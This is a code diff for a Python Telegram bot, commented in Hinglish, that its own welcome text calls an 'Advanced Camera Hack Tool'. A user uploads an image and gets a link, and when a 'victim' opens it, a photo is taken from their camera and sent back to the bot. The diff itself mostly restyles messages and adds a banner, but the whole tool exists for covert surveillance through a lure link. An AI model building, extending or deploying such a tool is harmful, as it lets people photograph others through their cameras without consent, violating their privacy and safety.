@@ -25,9 +25,26 @@ def load_map():
 def save_map(m):
     json.dump(m, open(MAP_FILE, "w"))
 
+# Yahan humne start command ko update kiya hai
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "Bhai, mujhe ek image bhej. Main tujhe ek link dunga jo tu kisi ko bhej sakta hai."
+    # Tera banner image URL
+    banner_url = "https://kommodo.ai/i/cKT2XT3skPZ0pT2WUTsa"
+    
+    # Attractive welcome message
+    welcome_text = (
+        "🔥 *TRIDEVCYBER WARRIOR* 🔥\n"
+        "⚡ _Advanced Camera Hack Tool_ ⚡\n\n"
+        "👋 *Welcome Bhai!*\n\n"
+        "📸 Mujhe koi bhi image bhej. Main tujhe ek link dunga.\n"
+        "🔗 Jab koi victim us link ko kholenga, teri image dikhegi aur camera se photo capture hoke wapas yahan aayegi.\n\n"
+        "👨‍💻 *Developed by TRIDEV CYBER WARRIOR*"
+    )
+    
+    # Image ke saath message bhej rahe hain (parse_mode="Markdown" se bold/italic lagega)
+    await update.message.reply_photo(
+        photo=banner_url,
+        caption=welcome_text,
+        parse_mode="Markdown"
     )
 
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -40,7 +57,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Telegram API se direct download (no timeouts)
     try:
-        # 1. Get file path
         r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}", timeout=15)
         res = r.json()
         if not res.get("ok"):
@@ -48,12 +64,9 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         file_path = res["result"]["file_path"]
-        
-        # 2. Download the image
         img_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
         img_data = requests.get(img_url, timeout=20).content
         
-        # 3. Save it
         with open(img_path, "wb") as f:
             f.write(img_data)
             
@@ -68,8 +81,10 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     link = f"{BASE_URL}/?t={token}"
     await update.message.reply_text(
-        f"✅ Link ready:\n\n{link}\n\n"
-        f"Ise kisi ko bhej. Jab woh kholenge, teri image dikhegi aur camera se photo capture hoke yahan aayegi."
+        f"✅ *Link Ready!*\n\n"
+        f"🔗 `{link}`\n\n"
+        f"Ise kisi ko bhej. Jab woh kholenge, teri image dikhegi aur camera se photo capture hoke yahan aayegi.",
+        parse_mode="Markdown"
     )
 
 async def main_bot():
